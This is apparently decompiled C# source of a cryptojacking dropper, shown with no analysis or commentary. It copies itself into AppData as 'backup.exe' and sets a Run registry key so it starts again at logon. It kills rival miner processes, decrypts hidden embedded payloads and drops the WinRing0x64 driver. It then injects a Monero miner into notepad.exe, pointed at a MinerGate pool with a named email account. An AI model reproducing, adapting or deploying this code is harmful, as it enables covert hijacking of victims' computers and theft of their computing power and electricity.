using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

public class Program
{
	public Program()
	{
		Class7.FjOGF5QzEpyy7();
		base._002Ector();
	}

	[STAThread]
	public static void Main()
	{
		Install();
		KillLastProc();
		Initialize();
	}

	public static void Install()
	{
		Thread.Sleep(2000);
		try
		{
			if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "backup.exe"), false) == 0)
			{
				return;
			}
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (Operators.CompareString(process.MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "backup.exe"), false) == 0)
					{
						process.Kill();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			using (FileStream fileStream = new FileStream(Path.Combine(Interaction.Environ("AppData"), "backup.exe"), FileMode.Create))
			{
				byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule!.FileName);
				fileStream.Write(array, 0, array.Length);
			}
			Thread.Sleep(2000);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(Path.Combine(Interaction.Environ("AppData"), "backup.exe")), Path.Combine(Interaction.Environ("AppData"), "backup.exe"));
			Process.Start(Path.Combine(Interaction.Environ("AppData"), "backup.exe"));
			Environment.Exit(0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] GetTheResource(string Get_)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		ResourceManager resourceManager = new ResourceManager("phoslre", executingAssembly);
		return AES_Decryptor((byte[])resourceManager.GetObject(Get_));
	}

	public static void Run(byte[] PL, string arg, byte[] buffer)
	{
		try
		{
			Assembly.Load(PL).GetType("Project1.Program")!.GetMethod("Load", BindingFlags.Static | BindingFlags.Public)!.Invoke(null, new object[3] { buffer, "C:\\WINDOWS\\System32\\notepad.exe", arg });
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void KillLastProc()
	{
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		IEnumerable enumerable = default(IEnumerable);
		string text = default(string);
		ManagementObjectSearcher val = default(ManagementObjectSearcher);
		IEnumerator enumerator = default(IEnumerator);
		object objectValue2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num4;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 261:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							goto IL_0117;
						case 0:
							break;
						}
						break;
					}
					IL_0117:
					num4 = num2 + 1;
					num2 = 0;
					switch (num4)
					{
					case 1:
						break;
					case 2:
						goto IL_0008;
					case 3:
						goto IL_002b;
					case 4:
						goto IL_005c;
					case 5:
						goto IL_006f;
					case 6:
						goto IL_007a;
					case 7:
						goto IL_0084;
					case 8:
						goto IL_00a5;
					case 9:
						goto IL_00cd;
					case 10:
					case 11:
						goto IL_00e7;
					default:
						goto end_IL_0001;
					case 0:
						goto end_IL_0001;
					case 12:
						goto IL_0179;
					}
					goto default;
					IL_0008:
					num = 2;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\" + Environment.UserDomainName + "\\root\\cimv2", (string)null));
					goto IL_002b;
					IL_002b:
					num = 3;
					enumerable = (IEnumerable)RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecQuery", new object[1] { "Select * from Win32_Process" }, (string[])null, (Type[])null, (bool[])null));
					goto IL_005c;
					IL_005c:
					num = 4;
					text = string.Format("select CommandLine from Win32_Process where Name='{0}'", "notepad.exe");
					goto IL_006f;
					IL_006f:
					num = 5;
					val = new ManagementObjectSearcher(text);
					goto IL_007a;
					IL_007a:
					num = 6;
					val.Get();
					goto IL_0084;
					IL_0084:
					num = 7;
					enumerator = enumerable.GetEnumerator();
					goto IL_008f;
					IL_008f:
					if (enumerator.MoveNext())
					{
						objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
						goto IL_00a5;
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto IL_0179;
					IL_00e7:
					num = 11;
					goto IL_008f;
					IL_00a5:
					num = 8;
					if (NewLateBinding.LateGet(objectValue2, (Type)null, "CommandLine", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()!.Contains("--donate-level="))
					{
						goto IL_00cd;
					}
					goto IL_00e7;
					IL_00cd:
					num = 9;
					NewLateBinding.LateCall(objectValue2, (Type)null, "Terminate", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_00e7;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 261;
				continue;
			}
			break;
			IL_0179:
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return;
		}
		throw ProjectData.CreateProjectError(-2146828237);
	}

	public static void Initialize()
	{
		try
		{
			byte[] theResource = GetTheResource("tfejx");
			byte[] theResource2 = GetTheResource("dawzjbmy");
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinCFG\\Libs\\";
			string text2 = "";
			try
			{
				Directory.CreateDirectory(text);
				((ServerComputer)Class3.Class2_0).get_FileSystem().WriteAllBytes(text + "WinRing0x64.sys", theResource2, false);
				byte[] theResource3 = GetTheResource("pxilouujq");
				using (ZipArchive zipArchive = new ZipArchive(new MemoryStream(theResource3)))
				{
					foreach (ZipArchiveEntry entry in zipArchive.Entries)
					{
						entry.ExtractToFile(Path.Combine(text, entry.FullName), overwrite: true);
					}
				}
				text2 += " --opencl --cuda ";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			text2 += " --donate-level=4 ";
			text2 += " --no-cpu ";
			Run(GetTheResource("sxixeuu"), text2 + " -B --coin=monero --url=xmr.pool.minergate.com:45700 --user=liamforsman3@gmail.com --pass= --cpu-max-threads-hint=50 --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --cuda-loader=\"" + text + "ddb64.dll\"", theResource);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] AES_Decryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.Default.GetBytes("bpfzgyqxt"));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
